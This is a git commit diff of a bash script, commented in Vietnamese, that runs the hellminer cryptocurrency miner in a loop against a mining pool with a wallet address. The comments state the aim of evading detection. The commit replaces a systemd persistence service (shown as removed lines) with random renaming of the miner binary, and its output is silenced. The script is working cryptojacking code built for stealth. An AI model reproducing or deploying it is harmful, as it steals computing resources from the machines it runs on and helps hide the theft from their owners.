569001d68f9612a1f443c551fe8e165bb884b041
Quqngdev <hovanquang2001122@gmail.com>
2024-07-09 21:06:35 +0700

    Update bin.sh

--- bin.sh
+++ bin.sh
@@ -1,29 +1,9 @@
 #!/bin/bash
 
-# Tạo file dịch vụ systemd
-create_systemd_service() {
-  cat <<EOF | sudo tee /etc/systemd/system/my_miner.service
-[Unit]
-Description=My Miner Service
-After=network.target
-
-[Service]
-ExecStart=/usr/local/bin/my_miner.sh
-Restart=always
-User=nobody
-Group=nogroup
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-EOF
+# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
+generate_random_name() {
+  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
-
-# Tạo script shell
-create_shell_script() {
-  cat <<'EOF' | sudo tee /usr/local/bin/my_miner.sh
-#!/bin/bash
 
 # Vòng lặp vô hạn để script chạy liên tục
 while true; do
@@ -35,10 +15,11 @@ while true; do
   rm -f hellminer_linux64_avx2.tar.gz
 
   # Đổi tên file để khó phát hiện hơn
-  mv hellminer linux_update
+  random_name=$(generate_random_name)
+  mv hellminer "$random_name"
 
   # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
-  nohup ./linux_update -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
   miner_pid=$!
   sleep 1m
 
@@ -47,25 +28,8 @@ while true; do
 
   # Xóa các file đã tải và giải nén
   rm -f hellminer_linux64_avx2.tar.gz
-  rm -rf linux_update
+  rm -rf "$random_name"
 
   # Nghỉ 1 phút trước khi lặp lại
   sleep 2m
 done
-EOF
-  sudo chmod +x /usr/local/bin/my_miner.sh
-}
-
-# Tạo và khởi động dịch vụ
-setup_service() {
-  create_shell_script
-  create_systemd_service
-  sudo systemctl daemon-reload
-  sudo systemctl start my_miner.service
-  sudo systemctl enable my_miner.service
-}
-
-# Gọi hàm để thiết lập dịch vụ
-setup_service
-
-echo "Dịch vụ đã được cài đặt và khởi động thành công."
